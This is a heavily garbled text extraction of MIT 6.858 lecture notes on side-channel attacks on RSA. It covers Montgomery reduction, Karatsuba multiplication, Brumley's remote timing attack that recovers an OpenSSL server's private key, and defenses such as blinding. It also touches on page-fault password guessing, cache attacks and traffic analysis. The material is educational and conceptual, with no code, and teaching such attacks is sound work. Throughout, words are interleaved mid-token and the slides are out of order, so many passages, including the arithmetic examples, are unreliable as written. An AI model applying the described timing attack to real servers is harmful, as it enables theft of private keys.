obeobe	&#13; a	&#13; "neighborhood"	&#13; of	&#13; g	&#13; (g,	&#13; g+1,	&#13; ..,	&#13; g+400). 	&#13; 
o Noise	&#13; unrelated	&#13; to	&#13; computation	&#13; (e.g.	&#13; interrupts,	&#13; network	&#13; latency).	&#13; Con
sider	&#13; 	&#13; a	&#13; 400 -value	&#13; neighborhood	&#13; of	&#13; g	&#13; instead	&#13; of	&#13; measuring	&#13; g	&#13; 400	&#13; times?	&#13; 
 the	&#13; kinds	&#13; of	&#13; noise	&#13; we	&#13; are	&#13; trying	&#13; to	&#13; deal	&#13; with. 	&#13; 
 
o This	&#13; might	&#13; go	&#13; away	&#13; when	&#13; we	&#13; measure	&#13; the	&#13; same	&#13; thing	&#13; many	&#13; times.	&#13; 
"Noise"	&#13; related	&#13; to	&#13; computation.	&#13; 
 See	&#13; Figure	&#13; 2a	&#13; in	&#13; the	&#13; paper.	&#13; 
 E.g.,	&#13; multiplying	&#13; by	&#13; g^3	&#13; and	&#13; g_hi^3	&#13; in	&#13; sliding	&#13; window	&#13; takes	&#13; diff	&#13; 
 time.	&#13; 
Repeated	&#13; measurements	&#13; will	&#13; return	&#13; the	&#13; same	&#13; value.	&#13; 
 Will	&#13; not	&#13; help	&#13; determine	&#13; whether	&#13; mul	&#13; by	&#13; g	&#13; or	&#13; g_hi	&#13; has	&#13; more	&#13; 
o reduSee	&#13; Fct
igurion
e	&#13; 2b	&#13; in	&#13; the	&#13; papers.	&#13; 
o Since	&#13; neighborhood	&#13; values	&#13; are	&#13; nearby,	&#13; still	&#13; has	&#13; ~same	&#13; #	&#13; reductions.	&#13; Neighborhood	&#13; values	&#13; average	&#13; out.
	&#13; 	&#13; 
2nd	&#13; kind	&#13; of	&#13; noise. 	&#13; 
	&#13; 
How
 Timing	&#13; attack	&#13; on	&#13; decryption	&#13; time:	&#13; RSA	&#13; blinding.	&#13; 	&#13; to	&#13; 
oa
 void	&#13; these	&#13; attacks? 	&#13; 
o 
o Choose	&#13; 
Multiply	&#13; ciphertext	&#13; by	&#13; r^e	&#13; mod	&#13; n:	&#13; c'	&#13; =	&#13; c*r^e	&#13; mod	&#13; n.	&#13; random	&#13; r.	&#13; 
o o Due	&#13; to	&#13; multiplicative	&#13; property	&#13; of	&#13; RSA,	&#13; c'	&#13; is	&#13; an	&#13; encryption	&#13; of	&#13; m*r.	&#13; 
o Decrypt	&#13; ciphertext	&#13; c'	&#13; to	&#13; get	&#13; message	&#13; m'.	&#13; 
 Divide	&#13; plaintext	&#13; by	&#13; r:	&#13; m	&#13; =	&#13; m'/r.	&#13; 
Make	&#13; all	&#13; code	&#13; paths	&#13; predictable	&#13; in	&#13; terms	&#13; of	&#13; execution	&#13; time.	&#13; 
o About	&#13; a	&#13; 10%	&#13; CPU	&#13; overhead	&#13; for	&#13; OpenSSL,	&#13; according	&#13; to	&#13; Brumley's	&#13; paper. 	&#13; 
o 
o H
Preclard,	&#13; compilers	&#13; will	&#13; strive	&#13; to	&#13; remove	&#13; unnecessary	&#13; operations.	&#13; 
 Difficult	&#13; to	&#13; predict	&#13; execution	&#13; time:	&#13; instructions	&#13; aren't	&#13; fixed-time.	&#13; udes	&#13; efficient	&#13; special-case	&#13; algorithms.	&#13; 
Can
o	&#13; w
 
o e	&#13; take	&#13; away	&#13; access	&#13; to	&#13; precise	&#13; clocks? 	&#13; 
	&#13; o Ye
Cs	&#13; for	&#13; single -threaded	&#13; attackers	&#13; on	&#13; a	&#13; machine	&#13; we	&#13; control.	&#13; 
o CBut	&#13; wian	&#13; quantize	&#13; legitimate	&#13; computations,	&#13; at	&#13; some	&#13; performance	&#13; cost.	&#13; an	&#13; add	&#13; noise	&#13; to	&#13; legitimate	&#13; computation,	&#13; but	&#13; attacker	&#13; might	&#13; average.	&#13; 
th	&#13; "sleeping"	&#13;  quantization,	&#13; throughput	&#13; can	&#13; still	&#13; leak	&#13; info.	&#13; 
How
 
 Relatively	&#13; tr	&#13; worried	&#13; shou
icky	&#13; to	&#13; develop	&#13; an	&#13; exploit	&#13; (but	&#13; that's	&#13; a	&#13; oneld	&#13; we	&#13; be	&#13; about	&#13; these	&#13; attacks? 	&#13; 
Possible	&#13; to	&#13; notice	&#13; attack	&#13; on	&#13; server	&#13; (many	&#13; connection	&#13; requests).	&#13; 
o -time	&#13; problem).	&#13; 
 Adversary	&#13; has	&#13; to	&#13; be	&#13; close	&#13; by,	&#13; in	&#13; terms	&#13; of	&#13; network.	&#13; 
o Though	&#13; maybe	&#13; not	&#13; so	&#13; easy	&#13; on	&#13; a	&#13; busy	&#13; web	&#13; server	&#13; cluster? 	&#13; 
Not	&#13; that	&#13; big	&#13; of	&#13; a	&#13; problem	&#13; for	&#13; adversary.	&#13; 
7</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>V
Connected	&#13; to	&#13; Stanford's	&#13; campus	&#13; network.	&#13; ictim	&#13; Apache	&#13; HTTPS	&#13; web	&#13; server	&#13; using	&#13; OpenSSL,	&#13; has	&#13; private	&#13; key	&#13; in	&#13; memory.	&#13; 
 Adversary	&#13; controls	&#13; some	&#13; client	&#13; machine	&#13; on	&#13; campus	&#13; network.	&#13; Adversary	&#13; sends	&#13; specially-constructed	&#13; ciphertext	&#13; in	&#13; msg	&#13; to	&#13; server.	&#13; 
o 
o 
o Ser
Client	&#13; measures	&#13; response	&#13; time	&#13; to	&#13; get	&#13; error	&#13; message.	&#13; ver	&#13; decrypts	&#13; ciphertext,	&#13; finds	&#13; garbage	&#13; padding,	&#13; returns	&#13; an	&#13; error.	&#13; 
 Overall	&#13; response	&#13; time	&#13; is	&#13; on	&#13; the	&#13; order	&#13; of	&#13; 5	&#13; msec.	&#13; 
Wh
Once	&#13; guessed	&#13; enough	&#13; bits	&#13; of	&#13; q,	&#13; can	&#13; factor	&#13; n=p*q,	&#13; compute	&#13; d	&#13; from	&#13; e.	&#13; at	&#13; co Uses	&#13; the	&#13; response	&#13; time	&#13; to	&#13; guess	&#13; bits	&#13; of	&#13; q.	&#13; 
  ausTime	&#13; difference	&#13; between	&#13; requests	&#13; can	&#13; be	&#13; around	&#13; 10	&#13; usec.	&#13; 
 es	&#13; time	&#13; variations?	&#13; 	&#13; Karatsuba	&#13; vs	&#13; normal;	&#13; extra	&#13; reductions.	&#13; 
About	&#13; 1M	&#13; queries	&#13; seem	&#13; enough	&#13; to	&#13; obtain	&#13; 512-
o Only	&#13; need	&#13; to	&#13; guess	&#13; the	&#13; top	&#13; 256	&#13; bits	&#13; of	&#13; p	&#13; andbit	&#13; p	&#13; and
	&#13; q,	&#13; th	&#13; q 	&#13; 1
algorithm.	&#13; en	&#13; us	&#13; for
e	&#13; ano024-
thbi
et	&#13; ke
r	&#13; y.	&#13; 
	&#13; 
Attack	&#13; from	&#13; Brumley's	&#13; paper.	&#13; 
 
  Let
Assume	&#13; we	&#13; know	&#13; some	&#13; number	&#13; j	&#13; of	&#13; high-	&#13; q	&#13; =	&#13; q_0	&#13; q_1	&#13; ..	&#13; q_N,	&#13; where	&#13; N	&#13; =	&#13; |q|	&#13; (say,	&#13; 512	&#13; 
order	&#13; bbits	&#13; 
itfor	&#13; 
s	&#13; of	&#13; q	&#13; (q_0	&#13; t1024 -bit	&#13; ke
hrough	&#13; q_j).ys).	&#13; 
Construct	&#13; two	&#13; approximations	&#13; of	&#13; q,	&#13; guessing	&#13; q_{j+1}	&#13; is	&#13; either	&#13; 0	&#13; o
o 	&#13; 
Get	&#13; the	&#13; server	&#13; to	&#13; perform	&#13; modular	&#13; exponentiation	&#13; (g^d)	&#13; for	&#13; both	&#13; guesses.	&#13; o g	&#13; 	&#13; 	&#13; 	&#13; =	&#13; q_0	&#13; q_1	&#13; ..	&#13; q_j	&#13; 0	&#13; 0	&#13; 0	&#13; ..	&#13; 0r	&#13; 1:	&#13; 
 g_hi	&#13; =	&#13; q_0	&#13; q_1	&#13; ..	&#13; q_j	&#13; 1	&#13; 0	&#13; 0	&#13; ..	&#13; 0	&#13; 
o 	&#13; 
o 
o We
If	&#13; g	&#13; and	&#13; g_hi	&#13; are	&#13; both	&#13; less	&#13; than	&#13; q,	&#13; time	&#13; taken	&#13; shouldn't	&#13; change	&#13; much.	&#13; 	&#13; know	&#13; g	&#13; is	&#13; necessarily	&#13; less	&#13; than	&#13; q. 	&#13; 
If	&#13; g_hi	&#13; is	&#13; greater	&#13; than	&#13; q,	&#13; time	&#13; taken	&#13; might	&#13; change	&#13; noticeably.	&#13; 
  
 g_hi	&#13; mod	&#13; q	&#13; is	&#13; small.	&#13; 
o More	&#13; time:	&#13; switch	&#13; from	&#13; Karatsuba	&#13; to	&#13; normal	&#13; multiplication.	&#13; Less	&#13; time:	&#13; fewer	&#13; extra	&#13; reductions	&#13; in	&#13; Montgomery.	&#13; 
 How	&#13; to	&#13; get	&#13; the	&#13; server	&#13; to	&#13; perform	&#13; modular	&#13; exponentiation	&#13; on	&#13; our	&#13; guess?	&#13; 
o Knowing	&#13; the	&#13; time	&#13; taken	&#13; can	&#13; tell	&#13; us	&#13; if	&#13; 0	&#13; or	&#13; 1	&#13; was	&#13; the	&#13; right	&#13; guess.	&#13; 
How	&#13; do	&#13; we	&#13; know	&#13; if	&#13; the	&#13; time	&#13; difference	&#13; should	&#13; be	&#13; positive	&#13; or	&#13; negative?	&#13; o 
o 
 
oSince	&#13; Montgomery's	&#13; R	&#13; is	&#13; known,	&#13; send	&#13; (g/R	&#13; mod	&#13; n)	&#13; as	&#13; messOne	&#13; snag:	&#13; server	&#13; will	&#13; convert	&#13; our	&#13; message	&#13; to	&#13; Montgomery	&#13; form.	&#13; Send	&#13; our	&#13; guess	&#13; as	&#13; if	&#13; it	&#13; were	&#13; the	&#13; encryption	&#13; of	&#13; randomness	&#13; to	&#13; server.	&#13; 
 age	&#13; to	&#13; server. 	&#13; 
o 
o Paper	&#13; seems	&#13; to	&#13; suggest	&#13; it	&#13; doesn't	&#13; matter:	&#13; just	&#13; look	&#13; for	&#13; large	&#13; diff.	&#13; 
Figure	&#13; 3a	&#13; shows	&#13; the	&#13; measured	&#13; time	&#13; differences	&#13; for	&#13; each	&#13; bit's	&#13; guess.	&#13; 
o 
o Karatsuba	&#13; vs	&#13; normal	&#13; multiplication	&#13; 
First	&#13; 32	&#13; bits:	&#13; extra	&#13; reductions	&#13; dominate.	&#13; happens	&#13; at	&#13; 32-bit	&#13; boundaries. 	&#13; 
o 
 Next	&#13; bits:	&#13; Karatsuba	&#13; vs	&#13; normal	&#13; multiplication	&#13; dominates.	&#13; 
What	&#13; happens	&#13; if	&#13; the	&#13; time	&#13; difference	&#13; from	&#13; the	&#13; two	&#13; effects	&#13; cancels	&#13; out?	&#13; 
How	&#13; does	&#13; the	&#13; paper	&#13; get	&#13; accurate	&#13; measurements?	&#13; o At	&#13; some	&#13; point,	&#13; extra	&#13; reductions	&#13; start	&#13; dominating	&#13; again.	&#13; 
o 
 LaFigure	&#13; 3,	&#13; k
rger	&#13; ney	&#13; 3.
o eighborhood	&#13; 	&#13; 
changes	&#13; the	&#13; balance	&#13; a	&#13; bit,	&#13; reveals	&#13; a	&#13; non -zero	&#13; gap.	&#13; 
Client	&#13; machine	&#13; uses	&#13; processor's	&#13; timestamp	&#13; counter	&#13; (rdtsc	&#13; on	&#13; x86).	&#13; 
6</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>o E.g.,	&#13; B=2^32	&#13; when	&#13; splitting	&#13; 64 -bit	&#13; numbers	&#13; into	&#13; 32-bit	&#13; 
 components.	&#13; 
o Naive:	&#13; x
Four	&#13; multiplies:	&#13; O(n^2).	&#13; *y	&#13; =	&#13; x1y1	&#13; *	&#13; B^2	&#13; +	&#13; x0y1	&#13; *	&#13; B	&#13; +	&#13; x1y0	&#13; *	&#13; B	&#13; +	&#13; x0y0 	&#13; 
Fast

er:	&#13; 
 
 x*y	&#13; =	&#13; x1y1	&#13; 
o Just	&#13; three	&#13; multiplies,	&#13; and	&#13; a	&#13; few	&#13; more	&#13; additions.	&#13; =	&#13; x1y1	&#13; *	&#13; B^2	&#13; *	&#13; (B
+	&#13; (	&#13; ^2+B
-(x1-)	&#13; 
x0-	&#13; (x
)(1
y-
1x0
-y0)	&#13; +	&#13; x)(y1-y0)	&#13; *	&#13; B	&#13; +	&#13; x
1y1	&#13; +	&#13; x0y0	&#13; )	&#13; *	&#13; B	&#13; +	&#13; x0y0	&#13; *	&#13; (B+1)
0y0	&#13; 
	&#13; 
 
o Recursively	&#13; apply	&#13; this	&#13; algorithm	&#13; to	&#13; keep	&#13; splitting	&#13; into	&#13; more	&#13; halves.	&#13; 
Meani
 ngfSometimes	&#13; called	&#13; "recursive	&#13; multip
ully	&#13; faslication".	&#13; 
 
 For	&#13; 
n^2	&#13; 	&#13; 	&#13; 	&#13; 	&#13; =	&#13; 2561024-te
bir
t	&#13; ke	&#13; (no
y	&#13; h
s,	&#13; "n"	&#13; hidden	&#13; bi
ereg	&#13; c
	&#13; iso
	&#13; 1ns
6	&#13; (tants
	&#13; 512/3)	&#13; 
2).	&#13; 
 
 n^1.585	&#13; =	&#13; 81
  
accoMultiplication	&#13; algorithm	&#13; needs	&#13; to	&#13; decide	&#13; when	&#13; to	&#13; use	&#13; Karatsuba	&#13; vs.	&#13; Naive.	&#13; 
Two	&#13; cases	&#13; matter:	&#13; two	&#13; large	&#13; numbers,	&#13; and	&#13; one	&#13; large	&#13; +	&#13; one	&#13; small	&#13; number.	&#13; 
OpenSSL:	&#13; if	&#13; equal	&#13; number	&#13; of	&#13; components,	&#13; use	&#13; Karatsuba,	&#13; otherwise	&#13; Naive.	&#13; 
In	&#13; some	&#13; intermediate	&#13; cases,	&#13; Karatsuba	&#13; may	&#13; win	&#13; too,	&#13; but	&#13; OpenSSL	&#13; ignores	&#13; it,	&#13; 	&#13; 
	&#13; rding	&#13; to	&#13; this	&#13; paper. 	&#13; 
H 
 ow	&#13; does	&#13; SSL	&#13; use	&#13; RSA?	&#13; 
 SerServer	&#13; must	&#13; use	&#13; private	&#13; key	&#13; to	&#13; prove	&#13; its	&#13; identity.	&#13; ver's	&#13; SSL	&#13; certificate	&#13; contains	&#13; public	&#13; key.	&#13; 
 CServer	&#13; decrypts	&#13; client's	&#13; message,	&#13; uses	&#13; these	&#13; bits	&#13; to	&#13; generate	&#13; session	&#13; key.	&#13; lient	&#13; sends	&#13; random	&#13; bits	&#13; to	&#13; server,	&#13; encrypted	&#13; with	&#13; server's	&#13; public	&#13; key.	&#13; 
	&#13; o 
o HIn	&#13; reality,	&#13; server	&#13; also	&#13; verifies	&#13; message	&#13; padding.	&#13; 
owever,	&#13; can	&#13; still	&#13; measure	&#13; time	&#13; until	&#13; server	&#13; responds	&#13; in	&#13; some	&#13; way.	&#13; 
Fig
	&#13; 
               CRT              To Montgomery              Modular exp
    --&gt;  c_0 = c mod q  --&gt;  c'_0 = c_0*R mod q  --&gt;  m'_0 = (c'_0)^d mod qure	&#13; of	&#13; decryption	&#13; pipeline	&#13; on	&#13; the	&#13; server: 	&#13; 
 
 
   /   /                                             Use sliding window for bits  
 /                                                of the exponent d  
 
c                                               Karatsuba if c'_0 and q have  
                                                  same number of 32- bit parts 
 \ 
  \                                             Extra reductions proportional 
   
	&#13; 
	&#13; 	&#13; \                                              to ((c'_0)^z mod q) / 2R; 
	&#13; 	&#13;     --&gt;  ...                                      z comes from sliding window
Then,	&#13; compute	&#13; m_0	&#13; =	&#13; m'_0/R	&#13; mod	&#13; q.	&#13; 
Then,	&#13; combine	&#13; m_0	&#13; and	&#13; m_1	&#13; using	&#13; CRT	&#13; to	&#13; get	&#13; m.	&#13;  
	&#13; 	&#13; 
	&#13; 	&#13; Then	&#13; verify	&#13; padding	&#13; in	&#13; m.	&#13; 
	&#13; Finally,	&#13; use	&#13; payload	&#13; in	&#13; some	&#13; way	&#13; (SSL,	&#13; etc).	&#13; 
Setup	&#13; for	&#13; the	&#13; attack	&#13; described	&#13; in	&#13; Brumley's	&#13; paper.	&#13; 
5</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>Adversary	&#13; may	&#13; need	&#13; to	&#13; know	&#13; the	&#13; version,	&#13; optimization	&#13; flags,	&#13; etc	&#13; of	&#13; OpenSSL.	&#13; o 
Can	&#13; average	&#13; over	&#13; more	&#13; queries,	&#13; co-locate	&#13; nearby	&#13; (Amazon	&#13; EC
o nearby	&#13; bot	&#13; or	&#13; browser,	&#13; etc. 	&#13; 2),	&#13; run	&#13; on	&#13; a	&#13; 
o 
 Is
How	&#13; big	&#13; of	&#13; an	&#13; impediment	&#13; is	&#13; this?	&#13; 	&#13; it	&#13; a	&#13; good	&#13; idea	&#13; to	&#13; rely	&#13; on	&#13; such	&#13; a	&#13; defense?	&#13; 
	&#13; If	&#13; adversary	&#13; mounts	&#13; attack,	&#13; effects	&#13; are	&#13; quite	&#13; bad	&#13; (key	&#13; leaked).	&#13; 
Other	&#13; types	&#13; of	&#13; timing	&#13; attacks.	&#13; 
 Page
o-faul
 Suppose	&#13; the	&#13; kernel	&#13; provides	&#13; a	&#13; system	&#13; call	&#13; to	&#13; check	&#13; user's	&#13; password.	&#13; t	&#13; timing	&#13; for	&#13; password	&#13; guessing	&#13; [Tenex	&#13; system]	&#13; 
 
o C
mismatch.	&#13; hecks	&#13; the	&#13; password	&#13; one	&#13; byte	&#13; at	&#13; a	&#13; time,	&#13; returns	&#13; error	&#13; when	&#13; finds	&#13; 
o Adversary	&#13; aligns	&#13; password,	&#13; so	&#13; that	&#13; first	&#13; byte	&#13; is	&#13; at	&#13; the	&#13; end	&#13; of	&#13; a	&#13; page,	&#13; 
of	&#13; passwrest	&#13; 
 ord	&#13; is	&#13; on	&#13; next	&#13; page.	&#13; 
o Somehow	&#13; arrange	&#13; for	&#13; the	&#13; second	&#13; page	&#13; to	&#13; be	&#13; swapped	&#13; out	&#13; to	&#13; disk.	&#13; 
Measure	&#13; time	&#13; to	&#13; return	&#13; an	&#13; error	&#13; when	&#13; guessing	&#13; password.	&#13; 
 Or	&#13; just	&#13; unmap	&#13; the	&#13; next	&#13; page	&#13; entirely	&#13; (using	&#13; equivalent	&#13; of	&#13; mmap).	&#13; 
 diskIf	&#13; it	&#13; took	&#13; a	&#13; long	&#13; time,	&#13; kernel	&#13; had	&#13; to	&#13; read	&#13; in	&#13; the	&#13; second	&#13; page	&#13; from	&#13; 
[	&#13; Or,	&#13; if	&#13; unmapped,	&#13; if	&#13; crashed,	&#13; then	&#13; kernel	&#13; tried	&#13; to	&#13; read	&#13; second	&#13; .	&#13; 
o page.	&#13; ]	&#13; 
 Cache	&#13; 
o aCa
nan
l
	&#13; g 
uess	&#13; Means
an	&#13; fi
ysis	&#13; att	&#13; N-r
charactst	&#13; charac
er	&#13; passwter	&#13; was
ord	&#13; in	&#13; 256*N	&#13; t	&#13; right! 	&#13; 
ries,	&#13; rather	&#13; than	&#13; 256^N. 	&#13; 
o 
o E.g.:
Necessarily	&#13; evicts	&#13; something	&#13; else	&#13; in	&#13; the	&#13; cache.	&#13; 	&#13; accessa
ing	&#13; one	&#13; ofcks:	&#13; processor's	&#13; 
	&#13; the	&#13; slidca
ingche	&#13; 
-window	&#13; multiples	&#13; brings	&#13; it	&#13; in	&#13; cache.	&#13; shared	&#13; by	&#13; all	&#13; processes. 	&#13; 
o 
 Mali
Guess	&#13; pacious
rt	&#13; pr
s	&#13; of	&#13; exocess
ponent	&#13; could	&#13; f
	&#13; (d)	&#13; bill	&#13; cac
ased	&#13; on	&#13; offsethe	&#13; with	&#13; large
s	&#13; b	&#13; ar
eing	&#13; evictray,	&#13; watch
ed.	&#13; wh
	&#13; at's	&#13; evicted. 	&#13; 
Cache	&#13; attacks	&#13; are	&#13; potentially	&#13; problematic	&#13; with	&#13; "mobile	&#13; code".	&#13; 
o 
 Network	&#13; traffic	&#13; timing	&#13; /	&#13; analysis	&#13; attacks.	&#13; 
o NaCl	&#13; modules,	&#13; Javascript,	&#13; Flash,	&#13; etc	&#13; running	&#13; on	&#13; your	&#13; desktop	&#13; or	&#13; phone.	&#13; 
o Even	&#13; when	&#13; data	&#13; is	&#13; encrypted,	&#13; its	&#13; ciphertext	&#13; size	&#13; remains	&#13; ~same	&#13; as	&#13; 
o plaintext.Recent	&#13; papers	&#13; show	&#13; can	&#13; infer	&#13; a	&#13; lot	&#13; about	&#13; SSL/V	&#13; 
E.g.,	&#13; Fidelity	&#13; lets	&#13; customers	&#13; manage	&#13; stocks	&#13; through	&#13; an	&#13; SSL	&#13; web	&#13; site.	&#13; 
 PN	&#13; traffic	&#13; by	&#13; sizes,	&#13; timing.	&#13; 
 
Similar	&#13; to	&#13; C Web	&#13; site	&#13; displays	&#13; some	&#13; kind	&#13; of	&#13; pie	&#13; chart	&#13; image	&#13; for	&#13; each	&#13; stock.	&#13; 
 User's	&#13; browser	&#13; requests	&#13; images	&#13; for	&#13; all	&#13; of	&#13; the	&#13; user's	&#13; 
Adversary	&#13; can	&#13; enumerate	&#13; all	&#13; stock	&#13; pie	&#13; chart	&#13; images,	&#13; knows	&#13; sizes.	&#13; stocks.	&#13; 
o Can	&#13; t
RIME	&#13; attack	&#13; mentioned	&#13; in	&#13; guest	&#13; lecture	&#13; earlier	&#13; this	&#13; term.	&#13; ell	&#13; what	&#13; stocks	&#13; a	&#13; user	&#13; has,	&#13; based	&#13; on	&#13; sizes	&#13; of	&#13; data	&#13; transfers.	&#13; 
	&#13; 
Refer
 
 ences: 	&#13; 
 http://css.csail.mit.edu/6.858/2014/readings/ht-cache.pdf	&#13; 
http://www.tau.ac.il/~tromer/papers/cache-joc-
20090619.pdf	&#13; 
http://www.tau.ac.il/~tromer/papers/handsoff-20140731.pdf	&#13; 
8</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>Who
 y
o
o	&#13;  
 is	&#13; modular	&#13; multiplication	&#13; cheaper	&#13; in	&#13; montgomery	&#13; rep?	&#13; Each	&#13; mul	&#13; (or	&#13; sqr)	&#13; in	&#13; Montgomery-space	&#13; requires	&#13; division	&#13; by	&#13; R. 	&#13; 
 Choose	&#13; 
Because	&#13; we	&#13; divide	&#13; by	&#13; R,	&#13; we	&#13; will	&#13; often	&#13; not	&#13; need	&#13; to	&#13; do	&#13; mod	&#13; q.	&#13; 
 |aR|          = |q|R	&#13; so	&#13; division	&#13; by	&#13; R	&#13; is	&#13; easy:	&#13; R
 	&#13; =	&#13; 2^|q|	&#13; (2^512	&#13; for	&#13; 1024 -bit	&#13; keys). 	&#13; 
 |bR|          = |q| 
 |aR * bR|     = 2|q|
 |aR * bR /
o 
o Observation:	&#13; since	&#13; we	&#13; care	&#13; about	&#13; value	&#13; mod	&#13; q,	&#13; multiples	&#13; of	&#13; q	&#13; don't	&#13; How	&#13; do	&#13; we	&#13; divide	&#13; by	&#13; R	&#13; cheaply?	&#13; 	&#13; O 
 R| = |q| 
nly	&#13; works	&#13; if	&#13; lower	&#13; bits	&#13; are	&#13; zero. 	&#13; 
o matter.	&#13; 
Trick:	&#13; add	&#13; multiples	&#13; of	&#13; q	&#13; to	&#13; the	&#13; number	&#13; being	&#13; divided	&#13; by	&#13; R,	&#13; make	&#13; low	&#13; bits	&#13; 0.	&#13; 
 For	&#13; example,	&#13; suppose	&#13; R=2^4	&#13; (11010)	&#13; b
 y	&#13; R.(10000),	&#13; q=7	&#13; (111),	&#13; divide	&#13; x=26	&#13; 
 
 x+
x+22qq+	&#13; 	&#13; 	&#13; 	&#13; =	&#13; 
8q	&#13; (
	&#13; =bi
	&#13; (nar
binary)	&#13; 	&#13; 1
y)	&#13; 101
10
00
 00
0	&#13; 
GeneraNow
 ,	&#13; ca
lln	&#13; 
y,	&#13; aea
lsil
way	&#13; 
ys	&#13; possibdivide	&#13; by	&#13; 
le:R:	&#13; 
	&#13; result0
	&#13; is	&#13; 0	&#13; 
binary	&#13; 110	&#13; (or	&#13; 6). 	&#13; 
 
One	&#13; remaining	&#13; problem:	&#13; result	&#13; will	&#13; be	&#13; &lt;	&#13; R,	&#13; but	&#13; might	&#13; be	&#13; &gt;	&#13; q.	&#13;  Low	&#13; bit	&#13; of	&#13; q	&#13; is	&#13; 1	&#13; (q	&#13; is	&#13; prime),	&#13; so	&#13; can	&#13; "shoot	&#13; down"	&#13; any	&#13; bits.	&#13; 
 To	&#13; 
To	&#13; shoot"shoot	&#13; down"	&#13; bit	&#13; k,	&#13; add	&#13; 2^k	&#13; *	&#13; q
	&#13; down	&#13; low-order	&#13; bits	&#13; l,	&#13; add	&#13; q*(l	&#13; 
 *(-q^-1)	&#13; mod	&#13; R)	&#13; 
o Then,	&#13; dividing	&#13; by	&#13; R	&#13; means	&#13; simply	&#13; discarding	&#13; low	&#13; zero	&#13; bits.	&#13; 
o 
o If	&#13; the	&#13; result	&#13; happens
When	&#13; computing	&#13; x^d	&#13; mod	&#13; q,	&#13; Pr[extra	&#13; reduction]	&#13; =	&#13; (x	&#13; mod	&#13; q)	&#13; /	&#13; 2R.	&#13; This	&#13; is	&#13; ca
 lled	&#13; the	&#13; "ext	&#13; to	&#13; be	&#13; gr
ra	&#13; reducteater
ion".	&#13; than	&#13; q,	&#13; need
	&#13; 	&#13; to	&#13; subtract	&#13; q. 	&#13; 
 H
Intuition:	&#13; as	&#13; we	&#13; multiply	&#13; bigger	&#13; numbers,	&#13; will	&#13; overflow	&#13; more	&#13; ere,	&#13; x	&#13; is	&#13; assumed	&#13; to	&#13; be	&#13; already	&#13; in	&#13; Montgomery	&#13; form.	&#13; 
often.
	&#13; 
Optimization	&#13; 4:	&#13; Efficient	&#13; multiplication.	&#13; 	&#13; 
 
 
 H
Reprow	&#13; to	&#13; multiply	&#13; 512-bit	&#13; numbers?	&#13; 
Naive	&#13; 
oesentation:	&#13; br
 approach:	&#13; paeak	&#13; up	&#13; into	&#13; 32
ir-wise	&#13; multiplication	&#13; of	&#13; all	&#13; 32-bit	&#13; components.	&#13; -bit	&#13; values	&#13; (or	&#13; whatever	&#13; hardware	&#13; supports). 	&#13; 
o Same	&#13; as	&#13; if	&#13; you	&#13; were	&#13; doing	&#13; digit-wise	&#13; multiplication	&#13; of	&#13; numbers	&#13; on	&#13; paper.	&#13; 
o Requires	&#13; O(nm)	&#13; time	&#13; if	&#13; two	&#13; numbers	&#13; have	&#13; n	&#13; and	&#13; m	&#13; components	&#13; 
 resp
O(n^2)	&#13; if	&#13; the	&#13; two	&#13; numbers	&#13; are	&#13; close.	&#13; ectively. 	&#13; 
Karatsuba	&#13; multiplication:	&#13; assumes	&#13; both	&#13; numbers	&#13; have	&#13; same	&#13; number	&#13; of	&#13; components.	&#13; 
o o O(n^log_3(2))	&#13; =	&#13; O(n^1.585)	&#13; time.	&#13; Split	&#13; both	&#13; num
 
 x	&#13; =	&#13; x1	&#13; *	&#13; B	&#13; +bers	&#13; (x	&#13; and	&#13; y)	&#13; into	&#13; two	&#13; components	&#13; (x1,	&#13; x0	&#13; and	&#13; y1,	&#13; y0).	&#13; 
y	&#13; =	&#13; y1	&#13; *	&#13; B	&#13; +	&#13; y0	&#13; x0	&#13; 
	&#13; 
4</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858	&#13; Lecture	&#13; 16 	&#13; 
Side-channel	&#13; A ttacks	&#13; on	&#13; RSA
	&#13; 
Side	&#13; channel	&#13; attacks:	&#13; histor	&#13; 
 
 Ref:	&#13; http: //cryptome.org/nsa-tempest.pdf	&#13; ically	&#13; worried	&#13; about	&#13; EM	&#13; signals	&#13; leaking.
	&#13; 	&#13; 
Broadly,	&#13; systems	&#13; may	&#13; need	&#13; to	&#13; worry	&#13; about	&#13; many	&#13; unexpected	&#13; ways	&#13; in	&#13; which	&#13; 
	&#13; information	&#13; can	&#13; be	&#13; revealed. 	&#13; 
Example	&#13; setting:	&#13; a	&#13; server	&#13; (e.g.,	&#13; Apache)	&#13; has	&#13; an	&#13; RSA	&#13; private	&#13; key.	&#13; 

	&#13;  

Many	&#13; information	&#13; leaks	&#13; have	&#13; been	&#13; looked	&#13; at: Server	&#13; uses	&#13; RSA	&#13; private	&#13; key	&#13; (e.g.,	&#13; decrypt	&#13; message	&#13; from	&#13; client).	&#13; 
Something	&#13; about	&#13; the	&#13; server's	&#13; computation	&#13; is	&#13; leaked	&#13; to	&#13; the	&#13; client.	&#13; 
  How	&#13;  long	&#13; it	&#13; takes	&#13; to	&#13; decr	&#13; 
 Emissions	&#13; from	&#13; the	&#13; CHow	&#13; decryption	&#13; affects	&#13; shaypt.
red	&#13; 	&#13; 
PU	&#13; itself	&#13; (RF,	&#13; audio,	&#13; power	&#13; consumption,	&#13; etc).	&#13; resources	&#13; (cache,	&#13; TLB,	&#13; branch	&#13; predictor). 	&#13; 
	&#13; 
Side
 
 E.g.,	&#13; operation	&#13; time	&#13; relates	&#13; to	&#13; whic-channel	&#13; attacks	&#13; don't	&#13; have	&#13; to	&#13; be	&#13; crypto
ra-rel
Or	&#13; time	&#13; related	&#13; to	&#13; how	&#13; many	&#13; common	&#13; friends	&#13; you	&#13; +	&#13; some	&#13; user	&#13; have	&#13; on	&#13; h	&#13; cha cter	&#13; of	&#13; paated.	&#13; 
ssword	&#13; was	&#13; incorrect. 	&#13; 
 
 Faceb
Or	&#13; recovering	&#13; printed	&#13; text	&#13; based	&#13; on	&#13; sound	&#13; from	&#13; dot-matrix	&#13; printerOr	&#13; how	&#13; loook.
 ng	&#13; i	&#13; 
